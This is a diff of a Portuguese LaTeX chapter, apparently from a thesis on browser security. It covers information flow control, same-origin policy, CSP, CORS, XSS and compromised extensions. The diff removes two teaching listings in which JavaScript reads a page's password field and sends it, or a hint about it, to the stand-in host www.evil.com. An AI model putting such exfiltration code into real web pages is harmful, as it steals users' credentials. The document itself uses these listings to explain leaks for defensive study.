@@ -15,23 +15,56 @@ Modelos mandatórios não atribuem explicitamente as regras de controle de acess
 \subsection{Controle do fluxo de informações}
 O controle do fluxo de informações (IFC -- \textit{information flow control}) é um mecanismo que atua, em tempo de execução, nos meios de propagação dos valores entre os espaços de armazenamento de um sistema computacional de modo a impedir fluxos não autorizados dos dados \cite{Denning1976}. IFC é um modelo discricionário e baseia-se em \textit{classes de segurança} ``altas'' e ``baixas'', simbolizadas pelas letras \texttt{<h>} e \texttt{<l>}, respectivamente, para indicar graus de confidencialidade das informações e dos seus espaços de armazenamento (\textit{heap}, pilha, redes, dispositivos etc). Operações entre entidades com classes de segurança diferentes, como a cópia do valor de uma variável \texttt{<h>} (confidencial) para a variável \texttt{<l>} (pública), são automaticamente impedidas de prosseguir.
 
-\subsection{SOP}
-A política de segurança SOP (\textit{Same-Origin Policy}) foi estabelecida para que os navegadores conseguissem dar suporte a páginas com conteúdo proveniente de domínios mistos com um mínimo de segurança contra o vazamento de informação entre esses domínios \cite{Hill2016}. Através desta política, os navegadores podem impedir um conjunto de ataques conhecido como \textit{cross-site resource forgery}, em que um domínio tenta instruir o navegador a fazer requisições para outro domínio em nome do usuário.
+IFC distingue entre fluxos de informação explícitos e implícitos. Um fluxo explícito ocorre quando uma informação classificada como ``alta'' é diretamente copiada para um contexto de classificação ``baixa'', como na listagem de código \ref{Src: jsIFCExplicitFlow}. Em um fluxo implícito, não é a informação em si que transita entre contextos de classificação diferente, mas sim alguma informação derivada dela através da qual seja possível fazer qualquer inferência sobre seu conteúdo. Um exemplo de fluxo implícito encontra-se la listagem \ref{Src: jsIFCImplicitFlow}. Um mecanismo que suporte IFC deve ser capaz de interromper vazamento de informação em ambos os tipos de fluxo.
+
+\lstinputlisting[language=JavaScript,
+inputencoding=utf8,
+label={Src: jsIFCExplicitFlow},
+caption={Vazamento de dados em fluxo explícito de informação}]{codigo/sample02-ifc-implicit.js}
+
+\lstinputlisting[language=JavaScript,
+inputencoding=utf8,
+label={Src: jsIFCImplicitFlow},
+caption={Vazamento de dados em fluxo implícito de informação}]{codigo/sample03-ifc-explicit.js}
+
+
+\subsection{SOP -- Same Origin Policy}
+A política de segurança SOP foi estabelecida para que os navegadores conseguissem dar suporte a páginas com conteúdo proveniente de domínios mistos com um mínimo de segurança contra o vazamento de informação entre esses domínios \cite{Hill2016}. Através desta política, os navegadores podem impedir um conjunto de ataques conhecido como \textit{cross-site resource forgery}, em que um domínio tenta instruir o navegador a fazer requisições para outro domínio em nome do usuário.
 
 O termo \textit{origem} é intercambiável com a expressão \textit{domínio} e ambos representam, para fins desta política, componentes do endereço de URL associado com cada recurso da web -- a saber, o \textit{protocolo}, o \textit{nome do host} e a \textit{porta TCP} de onde o recurso foi transferido \cite{Barth2011}. Os exemplos a seguir representam recursos de mesma origem:
 
-\indent\texttt{http://exemplo.com/}\\
-\indent\texttt{http://exemplo.com:80/}\\
-\indent\texttt{http://exemplo.com/path/file}
+\begin{tabular}{|l|c|l|r|}
+	\hline 
+	Endereço & Protocolo & Nome do \textit{host} & Porta \\ 
+	\hline 
+	\texttt{http://exemplo.com/} & http & exemplo.com & 80 \\ 
+	\hline 
+	\texttt{http://exemplo.com:80/} & http & exemplo.com & 80 \\ 
+	\hline 
+	\texttt{http://exemplo.com/path/file} & http & exemplo.com & 80 \\ 
+	\hline 
+\end{tabular} 
+
 
 Os endereços a seguir representam recursos de origens diferentes:
 
-\indent\texttt{http://exemplo.com/}\\
-\indent\texttt{http://exemplo.com:8080/}\\
-\indent\texttt{http://www.exemplo.com/}\\
-\indent\texttt{https://exemplo.com:80/}\\
-\indent\texttt{https://exemplo.com/}\\
-\indent\texttt{http://exemplo.org/}
+\begin{tabular}{|l|c|l|r|}
+	\hline 
+	Endereço & Protocolo & Nome do \textit{host} & Porta \\ 
+	\hline 
+	\texttt{http://exemplo.com/} & http & exemplo.com & 80 \\ 
+	\hline 
+	\texttt{http://exemplo.com:8080/} & http & exemplo.com & 8080 \\ 
+	\hline 
+	\texttt{http://www.exemplo.com/} & http & www.exemplo.com & 80 \\ 
+	\hline 
+	\texttt{https://exemplo.com:80/} & https & exemplo.com & 80 \\ 
+	\hline
+	\texttt{https://exemplo.com/} & https & exemplo.com & 443 \\ 
+	\hline
+	\texttt{http://exemplo.org/} & http & exemplo.org & 80 \\ 
+	\hline
+\end{tabular}
 
 Segundo a SOP, as atividades derivadas da inclusão de recursos de origens mistas são categorizadas em três ações \cite{Ruderman2017}:
 
@@ -43,6 +76,14 @@ Segundo a SOP, as atividades derivadas da inclusão de recursos de origens mista
 
 Um aspecto importante da SOP é o tratamento dado a scripts incorporados. Quando uma página inclui um script proveniente de outras origens, por exemplo pelo uso de uma CDNs (\textit{content distribution networks}), esses scripts são executados em contexto da origem do documento em que eles foram incorporados. Isto permite, por exemplo, que \textit{frameworks} populares como jQuery e Angular.js possam ser disponibilizados em CDNs sem perder funcionalidades importantes, como a capacidade de iniciar chamadas assíncronas pela técnica AJAX. Esta concessão da SOP, porém, abre a possibilidade de que esses scripts, se adulterados, executem atividades maliciosas sem impedimentos.
 
+\subsection{CSP -- Content Security Policy}
+CSP foi criada como um complemento à SOP, elevando a capacidade do navegador de servir como plataforma razoavelmente segura para composição de aplicações \textit{mashup} ao estabelecer um protocolo para o compartilhamento de dados entre os componentes da página que residam em domínios diferentes. CSP define um conjunto de diretivas (codificadas como cabeçalhos HTTP) para a definição de \textit{whitelists} -- o conjunto de origens confiáveis em um dado momento -- pelas quais navegador e provedores de conteúdo estabelecem o controle de acesso e o uso permitido de recursos embutidos como scripts, folhas de estilos, imagens e vídeos, entre outros. Através desse protocolo, ataques de XSS que podem ser neutralizados desde que todos os componentes na página sejam aderentes à mesma política de CSP.
+
+\subsection{CORS -- Cross-Origin Resource Sharing}
+Assim como a CSP, o mecanismo CORS \cite{W3C:CORS} complementa a SOP estabelecendo um conjunto de diretivas (cabeçalhos HTTP) para a negociação de acesso via Ajax/XHR a recursos hospedados em domínios diferentes. CORS determina que exista um vínculo de confiança entre navegadores e provedores de conteúdo, dificultando vazamento de informação ao mesmo tempo em que flexibiliza as funcionalidades das APIs. O uso de CORS permite que os autores de componentes e desenvolvedores de aplicações \textit{mashup} determinem o grau de exposição que cada conteúdo pode ter em relação aos outros conteúdos incorporados.
+
+CSP e CORS são recomendações do comitê W3C \cite{W3C:CSP} \cite{W3C:CORS}, sendo incorporados por todos os navegadores relevantes desde 2016 \cite{CanIUse:CSP} \cite{CanIUse:CORS}.
+
 \subsection{Vulnerabilidades}
 
 Violações de privacidade são possíveis nos navegadores por causa da natureza dinâmica da linguagem Javascript e de sua ausência de restrições de segurança em tempo de execução \cite{Jang2010}. Seus usuários estão expostos a ataques sutis com objetivos diversos como roubar \textit{cookies} e \textit{tokens} de autorização, redirecionar o navegador para sites falsos (\textit{phishing}), observar o histórico de navegação e rastrear o comportamento do usuário através dos movimentos do ponteiro do mouse e eventos de teclado. Para que scripts mal-intencionados sejam incorporados a páginas benignas, \textit{hackers} fazem uso de vulnerabilidades como \textit{cross-site scripting (XSS)} \cite{OWASP:XSS} e comprometimento de extensões \cite{Heule2015_Most_Dangerous_Code} do navegador.
@@ -53,57 +94,6 @@ Em Javascript, todos os recursos de código carregados dentro de uma mesma pági
 O emprego de medidas para prevenção de ataques XSS \cite{OWASP:XSS-CheatSheet} não elimina riscos inerentes à tecnologia do navegador. Uma vez que componentes incorporados, como anúncios e \textit{players} de mídia, conseguem carregar scripts tidos como confiáveis dinamicamente, um único trecho de código comprometido pode colocar informações em risco sem qualquer interferência dos dispositivos de segurança.
 
 \subsubsection{Comprometimento de extensões}
-
 Os mecanismos de extensibilidade oferecidos pelos navegadores\footnote{``Extensões'' e \textit{``apps''} do Chrome; e ``complementos'' do Firefox e do Internet Explorer} melhoram a funcionalidade da web para os usuários, e o código de que são feitos é executado com privilégios mais elevados do que o dos scripts incorporados pelos \textit{sites}. Por isso, os usuários precisam confirmar ao navegador que aceitam que uma extensão seja instalada, sendo informados a respeito dos privilégios que a extensão pretende utilizar. O fato de que esse processo precisa se repetir a cada vez que uma extensão necessita de um conjunto de privilégios diferente faz com que os desenvolvedores optem por solicitar, de antemão, uma gama de privilégios maior que a estritamente necessária \cite{Heule2015_Most_Dangerous_Code}.
 
 Uma extensão que tiver sido comprometida (por exemplo, ao usar scripts de terceiros que, por sua vez, tenham sido redirecionados ou adulterados) terá assim poder para ler e transmitir todo o conteúdo carregado e exibido pelo navegador, com o potencial de causar os mesmos efeitos observados em um ataque XSS, mas em escopo e poder aumentados, já que poderiam afetar todas as páginas abertas e todas as APIs publicadas pelo navegador.
-
-\subsection{Abordagens tradicionais para contenção de ataques}
-
-\subsubsection{SOP -- Same Origin Policy}
-Implementada desde o primeiro navegador com suporte a Javascript, SOP \cite{W3C:SOP} é uma política que impõe limites aos meios pelos quais uma página ou script efetuam requisições a recursos que se encontram em \textit{domínios diferentes}\footnote{``Domínios'' identificam origens de recursos pela combinação do protocolo, do nome do host e da porta utilizados para o acesso ao recurso.}. SOP promove isolamento de informações ao impedir que o conteúdo em um domínio acesse conteúdo que tenha sido carregado em domínios diferentes.
-
-Na prática, essa política restringe funcionalidades importantes sem solucionar completamente o problema do vazamento de informações. SOP impede, por exemplo, que um script inicie requisições assíncronas\footnote{Através das	APIs Ajax e XHR} para outros domínios, ao mesmo tempo em que permite que um script incorporado através de XSS efetue vazamento da identidade do usuário. Em geral, os navegadores diminuem certas restrições da SOP para permitir APIs mais funcionais, e implementam meios mais flexíveis para proteção contra ataques de XSS.
-
-\subsubsection{CSP -- Content Security Policy}
-CSP foi criada como um complemento à SOP, elevando a capacidade do navegador de servir como plataforma razoavelmente segura para composição de aplicações \textit{mashup} ao estabelecer um protocolo para o compartilhamento de dados entre os componentes da página que residam em domínios diferentes. CSP define um conjunto de diretivas (codificadas como cabeçalhos HTTP) para a definição de \textit{whitelists} -- o conjunto de origens confiáveis em um dado momento -- pelas quais navegador e provedores de conteúdo estabelecem o controle de acesso e o uso permitido de recursos embutidos como scripts, folhas de estilos, imagens e vídeos, entre outros. Através desse protocolo, ataques de XSS que podem ser neutralizados desde que todos os componentes na página sejam aderentes à mesma política de CSP.
-
-\subsubsection{CORS -- Cross-Origin Resource Sharing}
-Assim como a CSP, o mecanismo CORS \cite{W3C:CORS} complementa a SOP estabelecendo um conjunto de diretivas (cabeçalhos HTTP) para a negociação de acesso via Ajax/XHR a recursos hospedados em domínios diferentes. CORS determina que exista um vínculo de confiança entre navegadores e provedores de conteúdo, dificultando vazamento de informação ao mesmo tempo em que flexibiliza as funcionalidades das APIs. O uso de CORS permite que os autores de componentes e desenvolvedores de aplicações \textit{mashup} determinem o grau de exposição que cada conteúdo pode ter em relação aos outros conteúdos incorporados.
-
-CSP e CORS são recomendações do comitê W3C \cite{W3C:CSP} \cite{W3C:CORS}, sendo incorporados por todos os navegadores relevantes desde 2016 \cite{CanIUse:CSP} \cite{CanIUse:CORS}.
-
-
-\subsection{Abordagens experimentais para contenção de ataques}
-Os mecanismos tradicionais são discricionários, pois as aplicações devem pré-estabelecer explicitamente seus parâmetros de segurança da informação (seja através de CSP ou CORS) para que o navegador configure um contexto de segurança correspondente \cite[p. 31]{stefan:2015:phdthesis}. Trata-se, ademais, de um controle estático, imutável durante todo o ciclo de vida da página, o que é inadequado para aplicações ao estilo \textit{mashup} em que os componentes da página podem ser desconhecidos no momento em que as diretivas de segurança são aplicadas pelo navegador.
-
-Uma característica fundamental das abordagens tradicionais é sua ênfase na comunicação de rede entre domínios distintos. Esse é um enfoque pertinente: a confiabilidade entre domínios é essencial para garantir um mínimo de segurança. No entanto, o navegador como um todo pode abrir vulnerabilidades que independem de conexões de rede para se concretizarem. \textit{Plugins} e extensões são executados com privilégios elevados e têm acesso a todas as partes do navegador com as quais os usuários interagem, podendo extender dinamicamente a linguagem Javascript para modificar seu funcionamento e rastrear de informações.
-
-
-
-\begin{lstlisting}[caption=Fluxo explícito de informação][language=JavaScript]
-var revelaH = function(h) {
-// O valor do parâmetro <h>, tido como confidencial, é explicitamente
-// propagado para o domínio www.evil.com:
-makeAjaxCall('www.evil.com/tell/secret/' + h);
-}
-
-var h = document.getElementById('password').value;
-revelaH(h);
-\end{lstlisting}
-
-
-\begin{lstlisting}[caption=Fluxo implícito de informação][language=JavaScript]
-var revelaH = function(h) {
-// Uma pista sobre o valor do parâmetro <h>, tido como confidencial,
-// é propagada para o domínio www.evil.com:
-var pista = h.charAt(0) === 's';
-makeAjaxCall('www.evil.com/tell/hint?startsWith=s&hint=' + pista);
-// Agora, www.evil.com sabe se o valor confidencial é
-// um texto iniciado com a letra "s"
-}
-
-var h = document.getElementById('password').value;
-revelaH(h);
-\end{lstlisting}
-
